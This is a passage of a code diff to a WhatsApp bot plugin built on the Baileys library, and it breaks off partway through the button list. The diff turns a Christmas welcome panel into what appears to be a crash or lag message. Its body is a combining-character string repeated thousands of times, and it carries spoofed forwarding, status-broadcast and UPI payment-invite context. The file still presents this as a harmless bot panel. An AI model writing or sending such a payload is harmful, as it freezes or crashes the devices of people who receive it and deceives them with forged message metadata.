@@ -1,27 +1,40 @@
-import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys'
+import { generateWAMessageFromContent } from '@whiskeysockets/baileys'
 
 let handler = async (m, { conn }) => {
   const content = {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
+          contextInfo: {
+            isForwarded: true,
+            forwardingScore: 1973,
+            businessMessageForwardInfo: {
+              businessOwnerJid: conn.user.jid,
+            },
+            participant: conn.user.jid,
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: "UPI",
+                expiryTimestamp: Date.now(),
+              },
+            },
+          },
           header: {
-            title: "🎄 Shadow-BOT-MD",
+            title: "🎄 Shadow-BOT-MD Panel",
             hasMediaAttachment: false,
           },
           body: {
-            text: "✨ Bienvenido al panel interactivo navideño.\nSelecciona una opción:",
-          },
-          footer: {
-            text: "⚔️ The Eminence in Shadow 🎅",
+            // aquí mantengo el texto "cargado" como lo tenías
+            text: "i ᡃ⃝ᡃ⃝ᡃ⃝...".repeat(5000) + " ...".repeat(5000),
           },
           nativeFlowMessage: {
             buttons: [
               {
                 name: "cta_url",
                 buttonParamsJson: JSON.stringify({
-                  display_text: "Visitar Canal Oficial 💚",
-                  url: "https://whatsapp.com/channel/0029VbArz9fAO7RGy2915k3O",
+                  display_text: "Canal Oficial 💚",
+                  url: "https://www.whatsapp.com/android",
                 }),
               },
               {
